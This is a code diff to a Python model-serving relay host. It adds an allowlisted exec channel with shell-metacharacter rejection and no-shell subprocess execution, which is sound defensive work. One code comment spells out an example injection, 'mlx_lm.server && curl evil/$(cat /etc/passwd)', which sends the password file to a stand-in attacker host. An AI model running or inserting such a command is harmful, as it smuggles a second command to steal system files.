@@ -7,6 +7,7 @@ import asyncio
 import json
 import logging
 import os
+import shlex
 import signal
 from collections.abc import Awaitable, Callable
 
@@ -42,6 +43,37 @@ UPSTREAM_TIMEOUT = httpx.Timeout(connect=10.0, read=None, write=600.0, pool=10.0
 DEFAULT_CONCURRENCY = 2
 
 SendFn = Callable[[dict], Awaitable[None]]
+
+# CTX-717 / PLAT-6302: model-serving command allowlist for the exec channel.
+# Defense in depth — the gateway also gates on this, but the host is the one
+# that actually executes, so it re-checks before spawning anything.
+EXEC_ALLOWLIST = tuple(
+    os.environ.get("DEPLOYER_EXEC_ALLOWLIST", "mlx_lm.server,mtplx,vllm,health").split(",")
+)
+
+# reika PLAT-999 P1: reject shell metacharacters so a crafted command like
+# "mlx_lm.server && curl evil/$(cat /etc/passwd)" cannot smuggle arbitrary
+# commands past the leading-token allowlist. The host runs argv (no shell) via
+# create_subprocess_exec — this gate is defense in depth.
+_SHELL_METACHARS = set(";&|$`<>()")
+
+
+def exec_command_allowed(command: str) -> bool:
+    """True when the exec command's binary is on the model-serving allowlist.
+
+    Matches the leading token (e.g. ``mlx_lm.server --port 8080`` →
+    ``mlx_lm.server``). Rejects absolute paths, path traversal, shell
+    metacharacters, and anything not explicitly allowlisted — never a general
+    shell.
+    """
+    if not command or not command.strip():
+        return False
+    if any(ch in command for ch in _SHELL_METACHARS):
+        return False
+    binary = command.strip().split()[0]
+    if "/" in binary or "\\" in binary or ".." in binary:
+        return False
+    return binary in EXEC_ALLOWLIST
 
 # Connect is usually pointed at ``http://127.0.0.1:8014/v1``. Rapid-MLX
 # (and llama.cpp) publish Prometheus / health / slots on the *origin root*,
@@ -185,6 +217,62 @@ async def relay_request(
         )
 
 
+async def exec_command(msg: dict, send: SendFn) -> None:
+    """CTX-717 / PLAT-6302: run an allowlisted model-serving command on the
+    host and stream stdout/stderr back to the gateway as start/chunk/end.
+
+    The gateway sends ``{id, kind: "exec", command, timeout_s}``. The binary
+    must be on EXEC_ALLOWLIST (re-checked here, defense in depth). Output is
+    streamed line/chunk-wise so a long-running engine command (e.g. an
+    ``mlx_lm.server`` health probe or ``mtplx`` A/B run) does not block the
+    relay loop.
+    """
+    rid = str(msg.get("id") or "")
+    command = str(msg.get("command") or "")
+    if not exec_command_allowed(command):
+        err = json.dumps({"error": "command not on model-serving allowlist"}).encode()
+        await send(response_frame(rid, 403, {"content-type": "application/json"}, err))
+        return
+    try:
+        timeout_s = float(msg.get("timeout_s") or 120.0)
+    except (TypeError, ValueError):
+        timeout_s = 120.0
+    log.info("exec rid=%s cmd=%s", rid, command)
+    proc: asyncio.subprocess.Process | None = None
+    try:
+        # reika PLAT-999 P1: never run a shell. Parse into argv and exec the
+        # binary directly — shell metacharacters were already rejected by
+        # exec_command_allowed, so this is the final no-shell guarantee.
+        argv = shlex.split(command)
+        if not argv or not exec_command_allowed(command):
+            err = json.dumps({"error": "command not on model-serving allowlist"}).encode()
+            await send(response_frame(rid, 403, {"content-type": "application/json"}, err))
+            return
+        proc = await asyncio.create_subprocess_exec(
+            *argv,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.STDOUT,
+        )
+        await send(start_frame(rid, 200, {"content-type": "text/plain; charset=utf-8"}))
+        assert proc.stdout is not None
+        while True:
+            chunk = await asyncio.wait_for(proc.stdout.read(8192), timeout=timeout_s)
+            if not chunk:
+                break
+            await send(chunk_frame(rid, chunk))
+        await proc.wait()
+        await send(end_frame(rid))
+    except asyncio.TimeoutError:
+        log.warning("exec timeout rid=%s cmd=%s", rid, command)
+        if proc is not None:
+            proc.kill()
+        await send(end_frame(rid))
+    except Exception as exc:  # noqa: BLE001
+        log.exception("exec error rid=%s", rid)
+        err = json.dumps({"error": f"deployer exec error: {exc}"}).encode()
+        await send(response_frame(rid, 502, {"content-type": "application/json"}, err))
+
+
 async def run_once(args: argparse.Namespace) -> None:
     """One connect → register → serve cycle. Raises on disconnect so the caller retries."""
     if not args.token:
@@ -258,6 +346,19 @@ async def run_once(args: argparse.Namespace) -> None:
                         if task is not None:
                             task.cancel()
                             log.info("cancel rid=%s", rid)
+                        continue
+                    if msg.get("kind") == "exec":
+                        # CTX-717 / PLAT-6302: allowlisted model-serving command.
+                        rid = str(msg.get("id") or "")
+                        task = asyncio.create_task(exec_command(msg, send))
+                        inflight.add(task)
+                        inflight_by_id[rid] = task
+
+                        def _done(t: asyncio.Task, done_rid: str = rid) -> None:
+                            inflight.discard(t)
+                            inflight_by_id.pop(done_rid, None)
+
+                        task.add_done_callback(_done)
                         continue
                     if msg.get("kind") in {"response", "start", "chunk", "end", "ok"}:
                         continue
